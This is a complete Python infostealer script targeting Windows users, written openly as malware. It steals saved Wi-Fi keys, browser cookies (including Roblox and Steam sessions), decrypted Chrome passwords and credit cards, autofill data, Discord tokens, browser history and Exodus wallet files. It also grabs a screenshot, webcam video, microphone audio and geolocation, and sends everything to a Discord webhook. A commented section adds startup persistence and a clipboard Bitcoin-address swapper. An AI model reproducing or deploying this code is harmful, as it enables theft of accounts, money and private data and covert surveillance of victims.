#Import libraries
from discord_webhook import DiscordWebhook, DiscordEmbed
import browser_cookie3
from urllib.request import urlopen
import subprocess
import json
import socket
import platform
import re
import sys
import os
import shutil
import uuid
import psutil
from browser_history import get_history
import chrome_bookmarks
import zipfile
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from PIL import ImageGrab
import cv2
import pyperclip
import sounddevice as sd
import numpy as np
import wavio
import threading


userhome = os.path.expanduser('~')
folderdir=os.path.join(userhome,'Data')
startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
script_file = os.path.basename(sys.executable)
startup_script_path = os.path.join(startfolder, script_file)

class DateTimeEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, datetime):
            return o.strftime("%Y-%m-%d %H:%M:%S")
        return super().default(o)

def convert_timestamp_to_readable(timestamp):
    # Convert timestamp to a readable date format
    return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp else "Session Cookie"


def copy_to_startup():
    try:
     if not os.path.exists(startup_script_path):
        shutil.copy2(sys.executable, startfolder)
    except PermissionError as e:
        pass  

def parse_saved_variables():
    variables = {}
    with open(os.path.join(sys.path[0], "saved_variables.txt"), "r") as file:
        for line in file:
            line = line.strip()
            if not line:
                continue  # Skip empty lines
            if ": " not in line:
                continue
            key, value = line.split(": ", 1)
            variables[key] = value
    return variables

parsed_variables = parse_saved_variables()
# Access the individual variables from the parsed dictionary
webhook_url = parsed_variables.get("Webhook URL")
copy_to_start_up = parsed_variables.get("Copy to startup?")
btc_wallet = parsed_variables.get("BTC wallet")

webhook = DiscordWebhook(url=f'{webhook_url}')#Set up webhook
#test #https://discord.com/api/webhooks/1131994024169963661/O5qGSqlm3_aJCVox5-3oKLEeF_znzWvmLMeDfyqQF2CICGnwY0BXYXlaHjuQlnVshZ02
#Suusy script https://discord.com/api/webhooks/1131994203019284581/S5wolQDreb40kHiaGO_qTSM4Ezs9MxH1MQrASxVu7Ko7k6R39G_p0y-cJy5UQKnqy81o
def ip4():#Get ipv4
    try:
     with urlopen('https://4.ident.me') as response:
       return response.read().decode('ascii')
    except:
     with urlopen('https://4.tnedi.me') as response:
       return response.read().decode('ascii')
def ip6():#get ipv6
    try:
     with urlopen('https://6.ident.me') as response:
       return response.read().decode('ascii')
    except:
     with urlopen('https://6.tnedi.me') as response:
       return response.read().decode('ascii')
def wifipass():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    wifi_info = {}

    if not profiles:
        return []

    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wifi_info[i] = results[0]
        except IndexError:
            wifi_info[i] = ""

    return wifi_info 
wifi=str(wifipass())
wifi=wifi.replace('{','')
wifi=wifi.replace('}','')
wifi=wifi.replace(',','\n')



url='http://ipinfo.io/json'
response = urlopen(url)
data = json.load(response)
org=data['org']
city = data['city']
country=data['country']
region=data['region']
loc=data['loc']
postal=data['postal']
latlong=str(loc).split(',')
lat,long=latlong[0],latlong[1]
timezone=data['timezone']
hostname=data['hostname']


def edge_logger():
    try:
        rcookies = browser_cookie3.edge(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return []
def chrome_logger():
    try:
        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return []
def firefox_logger():
    try:
        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return []
def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return []  
roblochrome,robloedge,roblofire,robloopera=chrome_logger(),edge_logger(),firefox_logger(),opera_logger()

def edge_steam():
    try:
        scookies = browser_cookie3.edge(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return None, None
def chrome_steam():
    try:
        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return None, None
def firefox_steam():
    try:
        scookies = browser_cookie3.firefox(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return None, None
def opera_steam():
    try:
        scookies = browser_cookie3.opera(domain_name='store.steampowered.com')
        scookies = str(scookies)
        scookie = scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        cookie = scookies.split('sessionid=')[1].split('for store.steampowered.com/>]>')[0].split('for store.steampowered.com/>')[0]
        return scookie, cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return None, None
edge_steam_cookie, edge_session_cookie = edge_steam()
chrome_steam_cookie, chrome_session_cookie = chrome_steam()
firefox_steam_cookie, firefox_session_cookie = firefox_steam()
opera_steam_cookie, opera_session_cookie = opera_steam()

def sysinfo():
    info={}
    info['Hostname']=socket.gethostname()
    info['Processor']=platform.processor()
    info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    info['Machine']=platform.machine()
    info['Architecture']=platform.architecture()
    info['OS']=platform.system()
    info['OS-release']=platform.release()
    info['OS-version']=platform.version()
    info['Mac-Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
    return json.dumps(info)
info=json.loads(sysinfo())

def history():
    history = get_history()
    his = history.histories
    with open(os.path.join(userhome,'history.txt'), 'w') as file:
     for item in his:
        json.dump(item, file, cls=DateTimeEncoder)
        file.write('\n')
    with open(os.path.join(userhome,'history.txt'), 'r') as file:
     filedata=file.read()
    try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"history.txt"))
    except:
          pass  
    return filedata  
def bookmarks():
    with open(os.path.join(userhome,'bookmarks.txt'),'w') as file:
     for url in chrome_bookmarks.urls:
      json.dump(url.url, file, cls=DateTimeEncoder)
      file.write('\n')
    with open(os.path.join(userhome,'bookmarks.txt'), 'r') as file:
     filedata=file.read() 
    try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"bookmarks.txt"))
    except:
         pass 
    return filedata   
def cookies():
    cookies = list(browser_cookie3.chrome()) 
    
    with open(os.path.join(userhome, 'cookies.txt'), 'w') as file:
        for cookie in cookies:
            file.write(f'Name: {cookie.name}\n')
            file.write(f'Value: {cookie.value}\n')
            file.write(f'Domain: {cookie.domain}\n')
            file.write(f'Path: {cookie.path}\n')
            file.write(f'{cookie.secure}\n')
            file.write(f'Expires: {convert_timestamp_to_readable(cookie.expires)}\n')
            file.write('***********************************\n')
    with open(os.path.join(userhome, 'cookies.txt'),'r') as file:
        filedata=file.read()
    try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"cookies.txt"))
    except:
         pass    
    return filedata                            
def zipfolder():
    folder_name = "my_folder"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    # Add a file to the created folder
    file_path = os.path.join(folder_name, "History.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(history())
    file_path = os.path.join(folder_name, "Bookmarks.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(bookmarks())
    file_path = os.path.join(folder_name, "Cookie.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(cookies())
    file_path = os.path.join(folder_name, "Credit-Cards.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(web_data()[0])
    file_path = os.path.join(folder_name, "Autofill.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(web_data()[1])
    file_path = os.path.join(folder_name, "Extracted-Passwords.txt")
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(SavedChromepass())

    # Zip the folder and its contents
    zip_file_path = folder_name + ".zip"
    with zipfile.ZipFile(zip_file_path, 'w') as zipf:
        for root, _, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_name))

    return zip_file_path
    
def chrome_date_and_time(chrome_data):
	# Chrome_data format is 'year-month-date
	# hr:mins:seconds.milliseconds
	# This will return datetime.datetime Object
	return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
def fetching_encryption_key():
	# Local_computer_directory_path will look
	# like this below
	# C: => Users => <Your_Name> => AppData =>
	# Local => Google => Chrome => User Data =>
	# Local State
	local_computer_directory_path = os.path.join(
	os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
	"User Data", "Local State")
	
	with open(local_computer_directory_path, "r", encoding="utf-8") as f:
		local_state_data = f.read()
		local_state_data = json.loads(local_state_data)

	# decoding the encryption key using base64
	encryption_key = base64.b64decode(
	local_state_data["os_crypt"]["encrypted_key"])
	
	# remove Windows Data Protection API (DPAPI) str
	encryption_key = encryption_key[5:]
	
	# return decrypted key
	return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
def password_decryption(password, encryption_key):
	try:
		iv = password[3:15]
		password = password[15:]
		
		# generate cipher
		cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
		
		# decrypt password
		return cipher.decrypt(password)[:-16].decode()
	except:
		
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return "No Passwords"
def web_data():
    creditcards = ""
    try:
        web_data_db = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Default", "Web Data")
        web_data_db_copy = os.path.join(
            os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            with open(os.path.join(userhome,"autofill.txt"), "w", encoding="utf-8") as f:
                for item in cursor.fetchall():
                    name = item[0]
                    value = item[1]
                    f.write(f"{name}: {value}\n")
            with open(os.path.join(userhome,'autofill.txt'),'r',encoding='utf-8') as f:
                autofill=f.read()        
            cursor.execute("SELECT * FROM credit_cards")

            with open(os.path.join(userhome,"credit_cards.txt"), "w", encoding="utf-8") as f:
                for item in cursor.fetchall():
                    username = item[1]
                    encrypted_password = item[4]
                    decrypted_password = password_decryption(
                        encrypted_password, fetching_encryption_key())
                    expire_mon = item[2]
                    expire_year = item[3]
                    f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")
            with open('credit_cards.txt','r',encoding='utf-8') as f:
                creditcards=f.read()
        except sqlite3.Error:
            pass
        
        conn.close()
        os.remove(web_data_db_copy)
        try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"credit_cards.txt"))
        except:
         pass 
        try:
         # trying to remove the copied db file as
         # well from the local computer
         os.remove(os.path.join(userhome,"autofill.txt"))
        except:
         pass
    except Exception as e:
        print("Error:", e)
    return creditcards, autofill
def SavedChromepass():

    # Call the existing main() function to extract login passwords
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # List to store the extracted passwords
    extracted_passwords = []

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usage = row[5]

        if user_name or decrypted_password:
            extracted_passwords.append({
                "Main URL": main_url,
                "Login URL": login_page_url,
                "User name": user_name,
                "Decrypted Password": decrypted_password,
                "Creation date": str(chrome_date_and_time(date_of_creation)) if date_of_creation != 86400000000 and date_of_creation else "",
                "Last Used": str(chrome_date_and_time(last_usage)) if last_usage != 86400000000 and last_usage else ""
            })
   
    cursor.close()
    db.close()
   
# os.path.join(userhome,
    # Write extracted passwords to a file
    with open(os.path.join(userhome,"extracted_passwords.txt"), "w", encoding="utf-8") as file:
        for entry in extracted_passwords:
            file.write("\n".join(f"{k}: {v}" for k, v in entry.items()) + "\n")
            file.write("**************************************************************")
            file.write('\n')
            
    with open(os.path.join(userhome,"extracted_passwords.txt"), "r", encoding="utf-8") as file:
       filedata=file.read()

    try:
        # trying to remove the copied db file as
        # well from the local computer
        os.remove(filename)
    except:
        pass 
    try:
        # trying to remove the copied db file as
        # well from the local computer
        os.remove(os.path.join(userhome,"extracted_passwords.txt"))
    except:
        pass 
    return filedata     

def Discordtokens():
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    hook = ""
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }
    try:
     for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(token)
    except:
        pass                                    
    return token                                    

def screenie():
    sss = ImageGrab.grab()
    sss.save(userhome+"\\AppData\\Local\\Temp\\ss.png")
    with open(userhome+"\\AppData\\Local\\Temp\\ss.png", "rb")as file:
     webhook.add_file(file.read(),'SCREENIE.png')
    try:
     os.remove(userhome+"\\AppData\\Local\\Temp\\ss.png")
    except:
     pass

def exo():
 if os.path.exists(userhome+"\\AppData\\Roaming\\Exodus"):
  try:   
   shutil.copytree(userhome+"\\AppData\\Roaming\\Exodus", userhome+"\\AppData\\Local\\Temp\\Exodus")
  except FileExistsError as e:
      pass
  shutil.make_archive(userhome+"\\AppData\\Local\\Temp\\Exodus", "zip", userhome+"\\AppData\\Local\\Temp\\Exodus")

  with open(userhome+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb') as f:
      webhook.add_file(f.read(),'exodusCryptoAppdata.zip')
  try:
   os.remove(userhome+"\\AppData\\Local\\Temp\\Exodus.zip")
   os.remove(userhome+"\\AppData\\Local\\Temp\\Exodus")
  except:
    pass

def webcam():
    # Open the device at the ID 0
    cap = cv2.VideoCapture(0)

    # Check whether the user-selected camera is opened successfully.
    if not cap.isOpened():
        NoWebcamEmbed = DiscordEmbed(title='No Webcam Detected!')
        webhook.add_embed(NoWebcamEmbed)

    # To set the resolution
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'MJPG')
    output_video_path = os.path.join(userhome, 'output_video.avi')
    out = cv2.VideoWriter(output_video_path, fourcc, 20.0, (640, 480))

    # Record the video for 5 seconds (100 frames at 20 frames per second)
    frame_count = 0
    while frame_count < 100:
        # Capture frame-by-frame
        ret, frame = cap.read()

        # Write the frame to the video file
        out.write(frame)

        # Increment the frame count
        frame_count += 1

        # Wait for 50 milliseconds per frame
        cv2.waitKey(50)

    # Release the capture, close the window, and stop recording
    cap.release()
    out.release()
    cv2.destroyAllWindows()

    # Read the video data in binary mode
    with open(output_video_path, 'rb') as f:
        videodata = f.read()

    try:
        os.remove(output_video_path)
    except:
        pass

    webhook.add_file(videodata, 'WebcamVideo.avi')
def record_audio(duration=5, freq=44100, channels=2):
    try:
        # Start recording with the given values of duration and sample frequency
        recording = sd.rec(int(duration * freq), samplerate=freq, channels=channels, dtype=np.int16)
        print("Recording...")

        # Wait for the recording to finish
        sd.wait()

        # Save the recorded audio to a WAV file
        wavio.write(os.path.join(userhome, 'MicRecording.wav'), recording, freq, sampwidth=2)

        print("Recording saved as", 'MicRecording.wav')
        with open(os.path.join(userhome, 'MicRecording.wav'), 'rb') as f:
            audio = f.read()
        webhook.add_file(audio, 'MicRecording.wav')
        try:
           os.remove(os.path.join(userhome, 'MicRecording.wav'))
        except:
            pass    
    except Exception as e:
        print("Error:", str(e))

   
webcamthread=threading.Thread(target=webcam())

micthread=threading.Thread(target=record_audio())

wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Router Hostname: {hostname}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```',color='fcba03')
robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
discordtokenembed= DiscordEmbed(title='Discord Token',description=f'Token:\n```{Discordtokens()}```')

webcamthread.start()
 
micthread.start()
try:
    
 with open(zipfolder(),'rb') as file:
       webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
except PermissionError as e:
    errorembed = DiscordEmbed(title='Permission error to access the browserfiles',description='```Victim needs computer shutdown for restrictions to be lifted```')
    webhook.add_embed(errorembed)   
    
webhook.add_embed(sysembed) 
webhook.add_embed(wifiembed)
webhook.add_embed(locationembed)
webhook.add_embed(robloxembed)
webhook.add_embed(steamloginembed)
webhook.add_embed(steamsesembed)
webhook.add_embed(discordtokenembed)
try:
 with open(zipfolder(),'rb') as file:
       webhook.add_file(file.read(), "History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip")
except PermissionError as e:
    webhook.set_content('Permission error to access the browserfiles. Victim needs computer shutdown for restrictions to be lifted')   
screenie()#screenshots the users screen  
   
exo()#get exodus cryptowallet Appdata and adds the zip to webhook
 
webcamthread.join()
micthread.join()

webhook.execute()

#INDEV (BTC WALLET ADDRESS REPLACER AND COPY TO STARTUP):
#if not os.path.realpath(sys.executable) == startup_script_path:
#    copy_to_startup()
#    webhook.execute()
#    os.remove(os.path.realpath(sys.executable))
#elif os.path.realpath(sys.executable) == startup_script_path:
#    while True:
#     try:
#         clipboarddata = pyperclip.paste()
#         ourbtc = re.search(r'^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,}$', clipboarddata)
#         if ourbtc:
#            pyperclip.copy(f"{btc_wallet}")
#     except pyperclip.PyperclipException:
#        pass   
